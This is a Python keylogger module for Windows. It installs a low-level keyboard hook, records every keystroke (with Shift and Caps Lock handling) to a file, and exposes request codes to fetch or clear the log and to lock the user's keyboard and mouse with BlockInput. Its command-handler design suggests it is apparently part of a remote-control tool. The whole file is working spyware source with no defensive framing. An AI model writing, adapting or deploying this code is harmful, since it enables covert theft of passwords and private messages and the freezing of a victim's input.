import ctypes
from ctypes import windll, byref, c_int, c_void_p, POINTER, CFUNCTYPE
from ctypes import wintypes
import threading
import time
import traceback
from pathlib import Path

from handler_state import HandlerState
from vkcode import VK_CODE, VK_SHIFT, VK_CAPS_LOCK, NormalChar

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_QUIT = 0x0012
INFINITE = 0xFFFFFFFF 

class Logger:
    MAX_BUFFER_LENGTH = 256
    FILE = None
    FILE_PATH = None
    tempBuffer = ""

    @staticmethod
    def Init(filepath):
        Logger.FILE_PATH = filepath
        Logger.FILE = open(Logger.FILE_PATH, "w+")
        Logger.FILE.close()
        Logger.FILE = open(Logger.FILE_PATH, "a+")

    @staticmethod
    def Del():
        Logger.FILE.close()
        Logger.tempBuffer = ""

    
    @staticmethod
    def Log(vkCode, isCapitalized):
        # Xu lyz
        to_write = ""
        char = VK_CODE[vkCode]
        if char != 'UKN' and vkCode != VK_CAPS_LOCK and vkCode not in VK_SHIFT:
            if type(char) != tuple:
                to_write = char
            else:
                to_write = char[1] if isCapitalized else char[0]

            if not NormalChar(vkCode):
                to_write = '<' + to_write + '>'

        Logger.tempBuffer += to_write
        if len(Logger.tempBuffer) >= Logger.MAX_BUFFER_LENGTH:
            Logger.DumpBuffer()

    @staticmethod
    def DumpBuffer():
        Logger.FILE.write(Logger.tempBuffer)
        Logger.tempBuffer = ""

    @staticmethod
    def Read():
        Logger.FILE.close()
        Logger.FILE = open(Logger.FILE_PATH, "r")
        content = Logger.FILE.read()
        content += Logger.tempBuffer
        Logger.FILE.close()
        Logger.FILE = open(Logger.FILE_PATH, "a+")
        return content

    @staticmethod
    def Clear():
        Logger.FILE.close()
        Logger.FILE = open(Logger.FILE_PATH, "w+")
        Logger.FILE.close()
        Logger.FILE = open(Logger.FILE_PATH, "a+")
        Logger.tempBuffer = ""
        pass

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [("vkCode", wintypes.DWORD),
                ("scanCode", wintypes.DWORD),
                ("flags", wintypes.DWORD),
                ("time", wintypes.DWORD),
                ("dwExtraInfo", wintypes.DWORD)]

LLKP_decl = CFUNCTYPE(c_int, c_int, wintypes.WPARAM, POINTER(KBDLLHOOKSTRUCT))
LPTHREAD_START_ROUTINE = ctypes.WINFUNCTYPE(wintypes.DWORD, wintypes.LPVOID)

def LowLevelKeyboardProc(nCode, wParam, lParam):
    global file, stop

    if (nCode < 0):
        return windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)

    if wParam == WM_KEYDOWN:
        #Check for SHIFT or CAPSLOCK
        shifted = any([windll.user32.GetAsyncKeyState(x) & 0x8000 for x in VK_SHIFT])
        capslocked = windll.user32.GetAsyncKeyState(VK_CAPS_LOCK) & 0x8000
        vkCode = lParam.contents.vkCode
        Logger.Log(vkCode, shifted or capslocked)

    return windll.user32.CallNextHookEx(hook, nCode, wParam, lParam)

def InstallHookAndLoop(lpParameter):
    global hook
    
    callback = LLKP_decl(LowLevelKeyboardProc)

    hook = windll.user32.SetWindowsHookExA(WH_KEYBOARD_LL, callback, 0,0)

    msg = wintypes.MSG()
    while windll.user32.GetMessageA(ctypes.byref(msg),None, 0,0):
        if (msg.message == WM_QUIT):
            windll.user32.UnhookWindowHookEx(hook)

        windll.user32.TranslateMessage(ctypes.byref(msg))
        windll.user32.DispatchMessage(ctypes.byref(msg))

    windll.user32.UnhookWindowsHookEx(hook)
    return 200

def StartThread(function):
    func = LPTHREAD_START_ROUTINE(function)
    threadID = wintypes.DWORD()
    handle = wintypes.HANDLE(windll.kernel32.CreateThread(None, 0, func, wintypes.LPVOID(0), 0, ctypes.byref(threadID)))

    if handle:
        windll.kernel32.WaitForSingleObject(handle, 1)

    return handle, threadID

def TimedCall(callback, seconds):
    time.sleep(seconds)
    callback()

class InputHandler:
    def __init__(self, filepath):
        global globalFile
        self.threadHandle = None
        self.threadID = wintypes.DWORD()
        self.hooked = False
        self.locked = False
        self.lockTimerThread = None
        Logger.Init(filepath)
        pass

    def Execute(self, reqCode:str, data:str):
        global file
        try:
            extraData = ""
            if reqCode == "FETCH":
                assert self.hooked, "Hook has not been installed"
                extraData = Logger.Read()
            elif reqCode == "HOOK":
                self.Hook()
            elif reqCode == "UNHOOK":
                self.Unhook()
            elif reqCode == "CLEAR":
                Logger.Clear()
            elif reqCode == "LOCK":
                if data == "" or data == None:
                    self.Lock(None)
                else:
                    self.Lock(int(data))
            elif reqCode == "UNLOCK":
                self.Unlock()
            else:
                return HandlerState.INVALID, None

            return HandlerState.SUCCEEDED, extraData.encode("utf-8")
            pass
        except Exception as e:
            traceback.print_exc()
            return HandlerState.FAILED, None

    def Hook(self):
        assert not self.hooked, "A hook already exists"
        self.threadHandle, self.threadID = StartThread(InstallHookAndLoop)
        self.hooked = True

    def Unhook(self):
        assert self.hooked, "No hook is installed"
        if (windll.user32.PostThreadMessageA(self.threadID, WM_QUIT, None, None)):
            self.threadID = wintypes.DWORD()
            self.threadHandle = None
            self.hooked = False
        else:
            raise OSError("Quit message is not posted")

    def Lock(self, duration=10):
        assert not self.locked, "Input is already locked."

        if duration != None:
            self.lockTimerThread = threading.Thread(target=self.TimedLock, args=(duration, ), daemon=True)
            self.lockTimerThread.start()
        else:
            state = windll.user32.BlockInput(True)
            assert state, "Cannot lock input"
            self.locked = True

    def TimedLock(self, duration):
        state = windll.user32.BlockInput(True)
        self.locked = True
        time.sleep(duration)
        self.Unlock()
        self.lockTimerThread = None

    def Unlock(self):
        assert self.locked, "Input is already unlocked."

        state = windll.user32.BlockInput(False)
        assert state, "Cannot unlock input."

        self.locked = False

    def __del(self):
        self.Unhook()
        if self.locked:
            self.Unlock()
        Logger.Del()
        pass

if __name__ == "__main__":
    # from pathlib import Path
    # import os
    # import time
    # a = KeystrokeHandler("temp.txt")
    # handle = StartThread(InstallHookAndLoop)
    # input("b: ")
    # print(Logger.Read())

    a = InputHandler("temp.txt")
    a.Execute("LOCK", "3")
    time.sleep(5)